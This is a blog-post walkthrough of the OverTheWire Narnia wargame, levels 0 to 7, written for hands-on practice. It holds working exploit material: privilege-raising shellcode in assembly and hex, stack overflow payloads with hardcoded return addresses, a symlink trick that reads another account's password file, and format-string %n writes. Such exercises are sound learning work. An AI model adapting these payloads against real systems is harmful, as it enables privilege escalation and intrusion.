---
layout: post
title:  "Narnia from OverTheWire"
date:   2024-04-15 00:17:00 +0530
categories: Binary Exploitation, CTFs and Reversing
---

Narnia is a set of challenges consisting of 10 levels on [overthewire.org](https://overthewire.org/wargames/narnia/)

I'll be attempting to solve the challenges and will post the solutions to each level on this very blog post, Starting from
15th April 2024. You can find all the scripts that I write [here](https://github.com/azorfus/azorfus.github.io/tree/blog/resources/overthewire.org/narnia)

## Level 0
Trival.
```py
from pwn import *

target = process("./narnia0")
print(target.recv())
target.send('A'*20 + "\xef\xbe\xad\xde\n")
print(target.recv())
target.interactive()
```
You get a shell.
```
cat /etc/narnia_pass/narnia1
<level 1 pass>
```

## Level 1
(April 19th, 2024)
This challenge requires an environment variable called EGG.
The program flow jumps to the address containing the value of EGG when ret()
is called, Since getenv() returns the address containing the value of EGG.

We could load EGG with shellcode that gets us a shell and run the binary.

A very basic shellcode execution exercise.

The stack is executable, this can be confirmed with a checksec command.

	checksec ./narnia1
	
	Arch:     i386-32-little
	RELRO:    Partial RELRO
	Stack:    No canary found
	NX:       NX unknown - GNU_STACK missing
	PIE:      No PIE (0x8048000)
	Stack:    Executable
	RWX:      Has RWX segments

We need shellcode that elevates the uid to narnia2 and spawns in a shell.
A very good manual on how to write shellcode: [Shellcode Guide](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)

The following assembly does that for us:

```asm
BITS 32

; setreuid(uid_t ruid, uid_t euid)
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx	; setting eax, ebx and ecx to 0. 

  mov al, 70        ; put 70 into eax, since setreuid is syscall #70
  mov bx, 0x36b2      ; put 14002 into ebx, to set real uid to narnia2
  mov cx, 0x36b2      ; put 14002 into ecx, to set effective uid to narnia2
  int 0x80          ; Call the kernel to make the system call happen
  jmp short two     ; Jump down to the bottom for the call trick

one:
  pop ebx           ; pop the "return address" from the stack
					; to put the address of the string into ebx

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; put 0 into eax
  mov [ebx+7], al   ; put the 0 from eax where the X is in the string
					; ( 7 bytes offset from the beginning)
  mov [ebx+8], ebx  ; put the address of the string from ebx where the
					; AAAA is in the string ( 8 bytes offset)
  mov [ebx+12], eax ; put the a NULL address (4 bytes of 0) where the
					; BBBB is in the string ( 12 bytes offset)
  mov al, 11        ; Now put 11 into eax, since execve is syscall #11
  lea ecx, [ebx+8]  ; Load the address of where the AAAA was in the string
					; into ecx
  lea edx, [ebx+12] ; Load the address of where the BBBB was in the string
					; into edx
  int 0x80          ; Call the kernel to make the system call happen

two:
  call one          ; Use a call to get back to the top and get the
  db '/bin/shXAAAABBBB' ; address of this string
```
Compiling and extracting the opcodes we get our shellcode:

	$ nasm -f elf32 shellcode.asm
	$ ld -m elf_i386 shellcode.asm

```
\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb2\x36\x66\xb9\xb2\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42
```

To set the environment variable EGG to our shellcode:

	$ echo -e "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb2\x36\x66\xb9\xb2\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" > shellcode.bin
	$ export EGG=$(cat shellcode.bin)

Now when we run our binary, we get an elevated shell:
	
	narnia1@gibson:/tmp/<temporary folder>$ /narnia/narnia1
	Trying to execute EGG!
	$ whoami
	narnia2
	$ cat /etc/narnia_pass/narnia2
	<level 2 pass>

## Level 2
Classic strcpy buffer overflow exercise. Stack is executable.

All we have to do is overwrite the return pointer and point it to our 
shellcode which gives us a shell.

We can use the shellcode used in the previous level here, just modify the
uid and change it to 14003 (narnia3's uid)

	\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42

You can check where the return pointer is stored by setting a break point at the
last instruction of main where esp holds the address where the return address
is stored. You can now see where to point your own return pointer.

Constructing a payload with all of this information:

	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42\xdd\xd4\xff\xff\x00\x00\x00\x00

Exploiting:

	echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42\xdd\xd4\xff\xff\x00\x00\x00\x00" > payload

	/narnia/narnia2 $(cat payload)

	-bash: warning: command substitution: ignored null byte in input
	$ whoami
	narnia3
	$ cat /etc/narnia_pass/narnia3
	<level 3 pass> 

## Level 3:
May 5th 2024
This level was simple. Looking at the source code, narnia3.c:

```c
#include <stdio.h>
...

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */

    strcpy(ifile, argv[1]);

    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }

...
```

We see that our bug is an unbounded strcpy(), overflow happens here.

Dissassembling the binary, We see that ifile and ofile are place 32 bytes apart,
We can overflow ifile and overwrite ofile. 
```
080491d6 <main>:
 80491d6:	55                   	push   ebp
 80491d7:	89 e5                	mov    ebp,esp
 80491d9:	83 ec 58             	sub    esp,0x58
 80491dc:	c7 45 e8 2f 64 65 76 	mov    DWORD PTR [ebp-0x18],0x7665642f ; <-- ofile
.
.
.
 8049221:	8d 45 c8             	lea    eax,[ebp-0x38] ; <-- ifile
 8049224:	50                   	push   eax
 8049225:	e8 46 fe ff ff       	call   8049070 <strcpy@plt>
```

Create file `ABX` at this location: `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX` and soft link it to the 
password file at `/etc/narnia_pass/narnia4`. Now create `ABX` in tmp: `/tmp/ABX`. Running the binary
with this payload gets us the password for next level.

```
$ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX to a safer place... (/tmp/ABX)
$ cat /tmp/ABX
<level 4 pass>
```

## Level 4:
May 8th 2024

This was a classic simple buffer overflow exploit. The binary restricts the use of environment variables
making it harder to exploit since you cannot store your shellcode in env variables. But we've not done it
this way before, So it becomes a repetitive task for us. We overflow the buffer with 264 bytes of data and
hijack return instruction pointer of main and pointer it to our shellcode.

`Note: The shellcode has been modified and the UID has been changed to 14005, i.e. The UID of narnia5`

```py
from pwn import *

payload = "\x90"*264 + "\x50\xd4\xff\xff" + "\x90"*100 + "\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb5\x36\x66\xb9\xb5\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"

target = process(["/narnia/narnia4", payload])
target.interactive()
```

You could also do this:
```
/tmp/XXX $ echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x50\xd4\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb5\x36\x66\xb9\xb5\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" > payload

/tmp/XXX $ /narnia/narnia4 $(cat payload)

$ whoami
narnia5

$ cat /etc/narnia_pass/narnia5
<level 5 pass>
```

## Level 5
Trivial.
Exploit: `/narnia/narnia5 $(echo -e "\x50\xcf\xff\xff\x40\xcf\xff\xffA%-491s%n")`
`%n: counts characters printed and not entered. So- %-491 prints 491 chars, not necessarily entered :P`

## Level 6
Trivial.
Exploit: `/narnia/narnia6 $(echo -e "AAAAAAAA\x70\x81\xc4\xf7") AAAAAAAA/bin/sh`
`\x70\x81\xc4\xf7 -> system()`
b1 is aligned after b2 in stack, so b2 will overwrite b1 with a null character. Convenient for us.

## Level 7
Easy.
We have to overwrite the address of ptrf(), But this is not directly possible by overflow. So we use the format string vulnerability to
point at the address of ptrf which is conveniently provided to us and overwrite it with the address of the hacked function, This is possible since
all hex addresses are just number. In my case the address was: `0x804931f`, converting that to decimal and subtracting 4 (the size of the address in
the payload) We get: `134517531`
Exploit: `/narnia/narnia7 $(echo -e "\x48\xd5\xff\xff%-134517531s%n")`

## Level 8
